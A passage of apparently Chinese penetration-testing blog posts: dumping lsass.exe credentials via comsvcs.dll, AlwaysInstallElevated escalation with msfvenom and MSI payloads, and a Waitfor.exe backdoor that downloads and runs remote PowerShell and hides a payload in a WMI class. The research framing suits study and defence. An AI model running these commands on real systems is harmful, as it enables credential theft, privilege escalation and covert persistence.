  <li>dump指定进程内存文件的常用方法</li>
  <li>使用comsvcs.dll实现dump指定进程内存文件的方法</li>
  <li>编写脚本实现自动化扫描dll的导出函数</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-dump指定进程内存文件的常用方法">0x02 dump指定进程内存文件的常用方法</h2>
<hr>

<p>在渗透测试中，最常用的方法是通过dump进程lsass.exe，从中获得明文口令和hash</p>

<p>在原理上都是使用API MiniDumpWriteDump，参考资料：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump</p>

<p>常用的实现方法如下：</p>

<h3 id="1procdump">1.procdump</h3>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre></div></div>

<h3 id="2c实现">2.c++实现</h3>

<p>https://github.com/killswitch-GUI/minidump-lib</p>

<h3 id="3powershell实现">3.powershell实现</h3>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</p>

<h3 id="4c实现">4.c#实现</h3>

<p>https://github.com/GhostPack/SharpDump</p>

<h2 id="0x03-使用comsvcsdll实现dump指定进程内存文件的方法">0x03 使用comsvcs.dll实现dump指定进程内存文件的方法</h2>
<hr>

<p>odzhan在文中给出了三种方法</p>

<h3 id="1通过rundll32">1.通过rundll32</h3>

<p>示例参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full
</code></pre></div></div>

<p>示例中lsass.exe的pid为808</p>

<p><strong>注：</strong></p>

<p>此处需要注意权限的问题，在dump指定进程内存文件时，需要开启SeDebugPrivilege权限</p>

<p>管理员权限的cmd下，默认支持SeDebugPrivilege权限，但是状态为Disabled，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-1.png" alt="Alt text"></p>

<p>所以说，直接在cmd下执行rundll32的命令尝试dump指定进程内存文件时，由于无法开启SeDebugPrivilege权限，所以会失败</p>

<p>这里给出我的一个解决方法：</p>

<p>管理员权限的powershell下，默认支持SeDebugPrivilege权限，并且状态为Enabled，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-2/2-2.png" alt="Alt text"></p>

<p>所以，这里可以通过powershell执行rundll32的命令实现，示例命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
</code></pre></div></div>

<h3 id="2通过vbs实现">2.通过vbs实现</h3>

<p>原文提供了完整的实现代码</p>

<p>执行的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cscript 1.vbs lsass.exe
</code></pre></div></div>

<p>vbs脚本首先开启SeDebugPrivilege权限，接着执行rundll32的命令，测试成功</p>

<h3 id="3通过c实现">3.通过c实现</h3>

<p>原文提供了完整的实现代码</p>

<p>代码先开启SeDebugPrivilege权限，再调用comsvcs.dll的导出函数MiniDumpW，测试成功</p>

<h2 id="0x04-编写脚本实现自动化扫描dll的导出函数">0x04 编写脚本实现自动化扫描dll的导出函数</h2>
<hr>

<p>学习完odzhan的文章以后，我产生了一个疑问：</p>

<p>Windows系统目录下是否存在其他可用的dll？</p>

<p>于是，我尝试通过脚本对系统目录下所有dll的导出函数进行筛选，查看是否包含导出函数MiniDumpW</p>

<p>脚本实现上需要考虑以下两个问题：</p>

<h3 id="1遍历指定目录获取所有dll">1.遍历指定目录，获取所有dll</h3>

<p>遍历路径C:\windows的测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
{
    $file.PSPath
}
</code></pre></div></div>

<p>由于存在多级目录，这里需要获得dll的绝对路径，而$file.PSPath的格式为<code class="language-plaintext highlighter-rouge">Microsoft.PowerShell.Core\FileSystem::C:\windows\RtlExUpd.dll</code>，实际路径需要去除前缀</p>

<p>优化后的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path 'C:\windows'  -ErrorAction SilentlyContinue )) 
{
    $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
}
</code></pre></div></div>

<h3 id="2获得指定dll的导出函数">2.获得指定dll的导出函数</h3>

<p>这里可以参考https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</p>

<p>在此基础上进行优化，实现整个流程的自动化处理</p>

<p>完整代码已上传至GitHub，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/Get-AllExports.ps1</p>

<p>对C:\Windows进行筛选的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ./Get-AllExports.ps1
$Path = 'C:\Windows'
ForEach($file in (Get-ChildItem -recurse -Filter "*.dll" -Path $Path  -ErrorAction SilentlyContinue )) 
{
#   $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
    Get-Exports -DllPath $file.PSPath.Substring($file.PSPath.IndexOf(":")+2)
}
</code></pre></div></div>

<p>测试系统：Win7x64</p>

<p>部分结果：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] C:\windows\system32\comsvcs.dll--&gt;MiniDumpW
[+] C:\windows\system32\dbghelp.dll--&gt;MiniDumpReadDumpStream
[+] C:\windows\system32\dbghelp.dll--&gt;MiniDumpWriteDump
[+] C:\Windows\Syswow64\comsvcs.dll--&gt;MiniDumpW
[+] C:\Windows\Syswow64\dbghelp.dll--&gt;MiniDumpReadDumpStream
[+] C:\Windows\Syswow64\dbghelp.dll--&gt;MiniDumpWriteDump
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v2.0.50727\SOS.dll--&gt;minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll--&gt;minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v2.0.50727\SOS.dll--&gt;minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;MinidumpMode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;Minidumpmode
[+] C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SOS.dll--&gt;minidumpmode
[+] C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll--&gt;MiniDumpW
[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll--&gt;MiniDumpReadDumpStream
[+] C:\Windows\winsxs\amd64_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_a6821d2940c2bcdc\dbghelp.dll--&gt;MiniDumpWriteDump
[+] C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll--&gt;MiniDumpW
[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll--&gt;MiniDumpReadDumpStream
[+] C:\Windows\winsxs\x86_microsoft-windows-imageanalysis_31bf3856ad364e35_6.1.7601.17514_none_4a6381a588654ba6\dbghelp.dll--&gt;MiniDumpWriteDump
</code></pre></div></div>

<p>测试结果如下：</p>

<h4 id="1对于不同结构的进程可用的dll不同">1.对于不同结构的进程，可用的dll不同</h4>

<p>对于32位的进程，可以使用32位和64位的dll：</p>

<ul>
  <li>C:\windows\system32\comsvcs.dll</li>
  <li>C:\Windows\Syswow64\comsvcs.dll</li>
  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
</ul>

<p>对于64位的进程，可以使用64位的dll：</p>

<ul>
  <li>C:\windows\system32\comsvcs.dll</li>
  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
</ul>

<p>无法使用32位的dll：</p>

<ul>
  <li>C:\Windows\Syswow64\comsvcs.dll</li>
  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
</ul>

<h4 id="2dbghelpdll对应api-minidumpwritedump">2.dbghelp.dll对应API MiniDumpWriteDump</h4>

<h4 id="3sosdll中的导出函数minidumpmode">3.SOS.dll中的导出函数minidumpmode</h4>

<p>用于防止在使用minidump时执行非安全命令。0表示禁用这个功能，1表示启用。默认为0</p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>如果想要dump指定进程的内存文件，可以使用新的方法，示例命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full"
</code></pre></div></div>

<p>其中comsvcs.dll可以替换为以下dll：</p>

<ul>
  <li>C:\Windows\Syswow64\comsvcs.dll</li>
  <li>C:\Windows\winsxs\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_ceb756d4b98f01a4\comsvcs.dll</li>
  <li>C:\Windows\winsxs\x86_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_6.1.7600.16385_none_7298bb510131906e\comsvcs.dll</li>
</ul>

<p>这种方法的优点是不需要上传文件，使用系统默认包含的dll就可以实现</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文在odzhan文章的基础上，补充在测试过程中需要注意的地方，扩展方法，分析利用思路。编写powershell脚本，实现自动化扫描系统目录下所有dll的导出函数。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September  2, 2019
  </div>

  
</article><article class="post">
  <h1>利用AlwaysInstallElevated提权的测试分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>利用AlwaysInstallElevated提权是一个2017年公开的技术，Metasploit和PowerUp都提供了利用方法</p>

<p>我在研究的过程中，发现Metasploit的利用方法存在一些不足，我遇到了和其他公开文章描述不一样的情况</p>

<p>于是我做了进一步的研究，本文将要介绍我遇到的问题和解决方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>常规利用方法</li>
  <li>我在测试中遇到的问题</li>
  <li>解决方法</li>
  <li>扩展利用思路</li>
</ul>

<h2 id="0x02-常规利用方法">0x02 常规利用方法</h2>
<hr>

<p>AlwaysInstallElevated是一个组策略配置，如果启用，那么将允许普通用户以SYSTEM权限运行安装文件(msi)</p>

<h3 id="启用方法">启用方法：</h3>

<p>需要修改以下两个组策略：</p>

<ul>
  <li>Computer Configuration\Administrative Templates\Windows Components\Windows Installer</li>
  <li>User Configuration\Administrative Templates\Windows Components\Windows Installer</li>
</ul>

<p>设置成Enabled，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>无法通过secedit.exe在命令行下修改以上两个组策略</p>

<h3 id="命令行下的启用方法">命令行下的启用方法：</h3>

<p>创建以下两个注册表项：</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer,AlwaysInstallElevated,1</li>
</ul>

<p>cmd的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
</code></pre></div></div>

<h3 id="利用方法">利用方法：</h3>

<p>启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行</p>

<p>调用msiexec的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i test.msi
</code></pre></div></div>

<p>/i参数用来表示安装操作</p>

<p>/q参数用来隐藏安装界面</p>

<p><strong>注：</strong></p>

<p>执行后会在%TEMP%下生成MSI的log文件</p>

<p>更多关于msiexec的介绍可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/">《渗透测试中的msiexec》</a></p>

<h2 id="0x03-开源方法测试">0x03 开源方法测试</h2>
<hr>

<p>在测试环境启用AlwaysInstallElevated，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
</code></pre></div></div>

<h3 id="1powerup">1.PowerUp</h3>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</p>

<p>(1)测试是否启用AlwaysInstallElevated</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated
</code></pre></div></div>

<p>返回True代表开启</p>

<p>(2)导出msi文件</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUp.ps1
Write-UserAddMSI
</code></pre></div></div>

<p>当前目录生成UserAdd.msi</p>

<p>(3)命令行执行(当前用户权限)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i UserAdd.msi
</code></pre></div></div>

<p>弹出添加用户的对话框，能够用来添加用户，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-2.png" alt="Alt text"></p>

<p>此时查看该对话框的权限为System，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-3.png" alt="Alt text"></p>

<p>提权成功</p>

<h3 id="2metasploit">2.Metasploit</h3>

<p>生成弹出计算器的msi文件，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/exec CMD=calc.exe -f msi &gt;calc.msi
</code></pre></div></div>

<p>命令行执行msi文件(当前用户权限)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i calc.msi
</code></pre></div></div>

<p>弹出的计算器权限为Medium，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/2-4.png" alt="Alt text"></p>

<p>这与PowerUp的结果不同</p>

<p>换成其他Payload的msi文件，例如添加用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/adduser USER=test PASS=12356QW!@ -f msi &gt;adduser.msi
</code></pre></div></div>

<p>例如执行cmd命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/exec CMD='whoami &gt;1.txt' -f msi &gt; cmd.msi
</code></pre></div></div>

<p>由于权限不够(为Medium)，均失败</p>

<p>这与其他公开文章介绍的情况不一样</p>

<p>个人猜测：</p>

<p>使用Metasploit生成的msi文件在运行时没有要求提升权限，所以导致了这个问题</p>

<h2 id="0x04-解决方法">0x04 解决方法</h2>
<hr>

<p>这里可以参考PowerUp的方式生成msi文件</p>

<p>直接执行PowerUp生成的UserAdd.msi，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-1.png" alt="Alt text"></p>

<p>提示msi文件是由MSI Wrapper生成</p>

<p>下面我们就尝试使用MSI Wrapper生成一个可用的Payload</p>

<p>下载地址：</p>

<p>https://www.exemsi.com/download/</p>

<p>生成过程如下：</p>

<h4 id="1将payload设置为执行processhacker">1.将Payload设置为执行ProcessHacker</h4>

<p>配置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-2.png" alt="Alt text"></p>

<h4 id="2运行时要求提升权限">2.运行时要求提升权限</h4>

<p>配置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>MSI installation context下选择Per User和Per Machine都可以</p>

<p>其他配置按照默认设置，生成的msi文件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/test/blob/master/RunProcessHacker.msi</p>

<p>再次测试，命令行执行msi文件(当前用户权限)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i RunProcessHacker.msi
</code></pre></div></div>

<p>ProcessHacker以System权限执行，利用成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/3-4.png" alt="Alt text"></p>

<p>综合以上的测试，我们可以得出结论：</p>

<p>使用Metasploit生成的msi文件在运行时没有要求提升权限，所以无法利用AlwaysInstallElevated提权</p>

<p>我们可以使用MSI Wrapper生成可供利用的msi文件</p>

<h2 id="0x05-扩展利用思路">0x05 扩展利用思路</h2>
<hr>

<p>通常情况下，先对注册表项进行判断，如果满足条件(存在两个注册表项)，就可以利用AlwaysInstallElevated提权</p>

<h3 id="扩展思路1">扩展思路1：</h3>

<p>如果获得了Backup service用户的权限，输入<code class="language-plaintext highlighter-rouge">whoami /priv</code>后，发现存在以下权限：</p>

<ul>
  <li>SeRestorePrivilege</li>
  <li>SeTakeOwnershipPrivilege</li>
</ul>

<p>此时能够对注册表进行写操作，可以创建对应的注册表项，再利用AlwaysInstallElevated提权</p>

<p>利用SeRestorePrivilege和SeTakeOwnershipPrivilege写注册表可参考之前的文章:<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/">《渗透技巧——Windows Token九种权限的利用》</a></p>

<h3 id="扩展思路2">扩展思路2：</h3>

<p>如果已获得系统权限，可以创建一个提权后门</p>

<p>对以下注册表项添加ACL，允许Everyone进行写操作：</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
</ul>

<p>对注册表项添加ACL的方法可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/">《渗透技巧——Windows下的Access Control List》</a></p>

<h3 id="扩展思路3">扩展思路3：</h3>

<p>msiexec支持远程下载执行，那么能否利用AlwaysInstallElevated提权？</p>

<p>测试命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /q /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
</code></pre></div></div>

<p>执行失败</p>

<p>下面查找原因，显示安装过程，测试命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec /i https://raw.githubusercontent.com/3gstudent/test/master/RunProcessHacker.msi
</code></pre></div></div>

<p>提示来源不可信，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-2/4-1.png" alt="Alt text"></p>

<p>得出结论：</p>

<p>msi文件需要可信的证书才能远程利用AlwaysInstallElevated提权</p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>如果没有特殊需求，禁用AlwaysInstallElevated</p>

<p>监控注册表项：</p>

<ul>
  <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
  <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了利用AlwaysInstallElevated提权的方法，找到了使用Metasploit生成的msi文件利用失败的原因，最后介绍了如何通过MSI Wrapper生成可供利用的msi文件</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July  2, 2019
  </div>

  
</article><article class="post">
  <h1>Use Waitfor.exe to maintain persistence</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>从Casey Smith‏@subTee的Twitter上获得的一个思路，利用Waitfor.exe有可能实现一种后门机制。
于是我对其做了进一步研究，并且使用Powershell写了一个后门利用的POC。
本文将要介绍Waitfor.exe在渗透测试中的利用技巧，并且分享开发POC的思路和细节。</p>

<p>完整POC下载地址如下：</p>

<p>https://github.com/3gstudent/Waitfor-Persistence</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要具体介绍以下内容：</p>

<ul>
  <li>Waitfor.exe简介</li>
  <li>利用思路</li>
  <li>POC细节</li>
</ul>

<h2 id="0x02-waitforexe简介">0x02 Waitfor.exe简介</h2>
<hr>

<p>用来同步网络中计算机，可以发送或等待系统上的信号</p>

<p><strong>支持系统：</strong></p>

<ul>
  <li>Windows Server 2003</li>
  <li>Windows Vista</li>
  <li>Windows XP</li>
  <li>Windows Server 2008</li>
  <li>Windows 7</li>
  <li>Windows Server 2003 with SP2</li>
  <li>Windows Server 2003 R2</li>
  <li>Windows Server 2008 R2</li>
  <li>Windows Server 2000</li>
  <li>Windows Server 2012</li>
  <li>Windows Server 2003 with SP1</li>
  <li>Windows 8</li>
  <li>Windows 10</li>
  <li>其他Server系统未测试，理论上支持</li>
</ul>

<p>位于System32文件夹下，以命令行方式启动</p>

<p>支持参数如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-1.png" alt="Alt text"></p>

<p><strong>具体细节如下：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/s &lt;Computer&gt;：指定发送的目的计算机的名称或IP地址（不能使用反斜杠）。如果不加此参数，将会在域内以广播形式发送

/u [&lt;Domain&gt;\]&lt;User&gt;：使用指定用户帐户的凭据运行脚本。如果不加此参数，表示使用当前用户的凭据

/p [&lt;Password&gt;]：用户密码

/si：表示发送信号，用于激活，如果不加此参数，表示等待接收信号

/t &lt;Timeout&gt;：指定等待信号的秒数。如果不加此参数，表示无限期等待

&lt;SignalName&gt;：指定的信号名称，大小写不敏感，长度不能超过225个字符
</code></pre></div></div>

<p><strong>注：</strong></p>

<blockquote>
  <p>Computers can only receive signals if they are in the same domain as the computer sending the signal.</p>
</blockquote>

<p>即同一网段的主机才能接收信号</p>

<p><strong>主要用途：</strong></p>

<p>实现同一网段内的主机同时执行命令</p>

<h3 id="测试实例">测试实例：</h3>

<p><strong>开启等待模式：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor signalcalc &amp;&amp; calc.exe</code></p>

<p>参数说明：</p>

<ul>
  <li>信号名称： signalcalc</li>
  <li>接收信号后的操作：calc.exe，即启动计算器</li>
</ul>

<p>此时，后台存在进程waitfor.exe</p>

<p><strong>发送信号：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si signalcalc</code></p>

<p>参数说明：</p>

<ul>
  <li>目的计算机：127.0.0.1（本机测试使用），域内使用换成主机ip</li>
  <li>/si表示发送信号</li>
  <li>信号名称： signalcalc</li>
</ul>

<p>详细操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-1.gif" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>更多基本介绍可参照微软官方文档，链接如下：</p>

<p>https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx</p>

<h2 id="0x03-利用思路">0x03 利用思路</h2>
<hr>

<p>根据以上的基本介绍，最直观的认识，waitfor可被当作后门来使用</p>

<p>Daniel Bohannon‏ @danielhbohannon在twitter上分享了他的利用思路：将waitfor接收信号后的操作设置为从远程服务器下载powershell代码并执行</p>

<p>地址如下：</p>

<p>https://twitter.com/danielhbohannon/status/872258924078092288</p>

<p>细节如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-2.png" alt="Alt text"></p>

<p>此外，他还提到了一个有趣的技巧：如果将powershell代码设置为延期执行，那么接收信号后，后台将不存在进程waitfor.exe</p>

<p>我验证了这个结论，方法如下：</p>

<p><strong>开启等待模式：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor test1 &amp;&amp; &amp;&amp; powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1')</code></p>

<p><strong>发送信号：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si test1</code></p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Start-Sleep -Seconds 10;
start-process calc.exe;
</code></pre></div></div>

<p>当成功接收信号后，进程waitfor.exe退出</p>

<p>接着执行powershell脚本，等待10秒再启动calc.exe</p>

<p>这10秒内，只存在进程powershell.exe</p>

<p>也就是说，如果把等待时间设置更长，那么再这一段等待时间内不存在进程waitfor.exe，提醒防御者注意这个细节</p>

<h2 id="0x04-poc细节">0x04 POC细节</h2>
<hr>

<p>如果作为一个后门，那么上面的利用方法还不够成熟</p>

<p>因为触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用</p>

<p>需要再次开启一个等待模式，才能再次触发后门</p>

<p>当然，可以在每次后门触发后手动开启一个等待模式</p>

<p>但这不够智能，能否通过脚本实现自动开启等待模式，使其成为一个可持续触发的后门呢？</p>

<p>为此，我写了以下POC</p>

<h3 id="思路1">思路1：</h3>

<p>在目标系统保存一个ps脚本1.ps1</p>

<p>1.ps1内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start-process calc.exe
cmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\test\1.ps1
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>转义字符&amp;在powershell中要用`&amp;表示</p>

<p><strong>开启等待模式：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\test\1.ps1</code></p>

<p><strong>发送信号：</strong></p>

<p>cmd：</p>

<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist1</code></p>

<h3 id="思路2">思路2：</h3>

<p>不在目标系统保存文件</p>

<p>这里使用一个之前在《WMI backdoor》中介绍过的技巧，将payload保存在WMI类中，进行读取使用</p>

<p>存储payload：</p>

<p>（管理员权限）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe")
$StaticClass.Put() 
</code></pre></div></div>

<p>读取payload：</p>

<p><code class="language-plaintext highlighter-rouge">([WmiClass] 'Win32_Backdoor').Properties['Code'].Value</code></p>

<p>以上操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-1.png" alt="Alt text"></p>

<p>执行payload：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>通过Invoke-Expression执行命令也可以，使用iex是为了缩短长度</p>

<p>结合waitfor的参数格式，这里选择将代码编码为base64</p>

<p>对执行payload的代码进行base64编码，以下代码保存在code.txt：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
</code></pre></div></div>

<p>对其进行base64编码，代码如下：</p>

